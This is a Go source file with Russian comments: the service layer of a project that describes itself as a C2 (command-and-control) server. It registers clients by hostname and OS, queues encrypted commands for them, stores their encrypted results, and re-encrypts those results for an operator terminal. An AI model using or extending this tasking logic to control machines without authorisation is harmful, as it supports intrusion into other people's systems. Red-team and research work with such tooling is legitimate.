// Package service реализует бизнес-логику C2: управление задачами,
// шифрование, взаимодействие с хранилищем.
package service

import (
	"encoding/base64"
	"fmt"
	"time"

	"c2project/internal/crypto"
	"c2project/internal/protocol"
	"c2project/internal/storage"
)

// Service — слой бизнес-логики C2.
type Service struct {
	store *storage.Storage
}

// New создаёт сервис поверх хранилища.
func New(store *storage.Storage) *Service {
	return &Service{store: store}
}

// RegisterClient регистрирует или обновляет данные клиента.
func (s *Service) RegisterClient(id, hostname, os string) {
	s.store.UpsertClient(id, hostname, os)
}

// CreateTask создаёт задачу для клиента, шифруя команду вторым ключом.
func (s *Service) CreateTask(clientID, plainCommand string) (string, error) {
	if _, err := s.store.GetClient(clientID); err != nil {
		return "", fmt.Errorf("check client: %w", err)
	}
	encCommand, err := crypto.Encrypt(protocol.KeyC2ToClient, []byte(plainCommand))
	if err != nil {
		return "", fmt.Errorf("encrypt command: %w", err)
	}
	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task := &storage.Task{
		ID:       taskID,
		ClientID: clientID,
		Command:  encCommand,
		Status:   protocol.StatusPending,
	}
	s.store.AddTask(task)
	return taskID, nil
}

// GetTaskForClient извлекает следующую задачу из очереди клиента.
func (s *Service) GetTaskForClient(clientID string) *storage.Task {
	return s.store.PopTask(clientID)
}

// StoreResult сохраняет зашифрованный результат, полученный от клиента.
func (s *Service) StoreResult(clientID string, encrypted []byte) error {
	task := s.store.FindPendingTaskByClient(clientID)
	if task == nil {
		return fmt.Errorf("no pending task for client %s", clientID)
	}
	if err := s.store.SetTaskResult(task.ID, encrypted, protocol.StatusDone); err != nil {
		return fmt.Errorf("set result: %w", err)
	}
	return nil
}

// GetStatus возвращает статус задачи с результатом, перешифрованным
// первым ключом для терминала.
func (s *Service) GetStatus(taskID string) (*protocol.StatusResponse, error) {
	task, err := s.store.GetTask(taskID)
	if err != nil {
		return nil, fmt.Errorf("get task: %w", err)
	}
	resp := &protocol.StatusResponse{
		TaskID: task.ID,
		Status: task.Status,
	}
	if task.Status != protocol.StatusDone || len(task.Result) == 0 {
		return resp, nil
	}
	plain, err := crypto.Decrypt(protocol.KeyC2ToClient, task.Result)
	if err != nil {
		return nil, fmt.Errorf("decrypt result: %w", err)
	}
	reenc, err := crypto.Encrypt(protocol.KeyTerminalToC2, plain)
	if err != nil {
		return nil, fmt.Errorf("re-encrypt result: %w", err)
	}
	resp.Result = base64.StdEncoding.EncodeToString(reenc)
	return resp, nil
}

// ListClients возвращает список клиентов для терминала.
func (s *Service) ListClients() []*protocol.ClientInfo {
	clients := s.store.ListClients()
	list := make([]*protocol.ClientInfo, 0, len(clients))
	for _, c := range clients {
		list = append(list, &protocol.ClientInfo{
			ClientID: c.ID,
			Hostname: c.Hostname,
			OS:       c.OS,
			LastSeen: c.LastSeen.Format(time.RFC3339),
		})
	}
	return list
}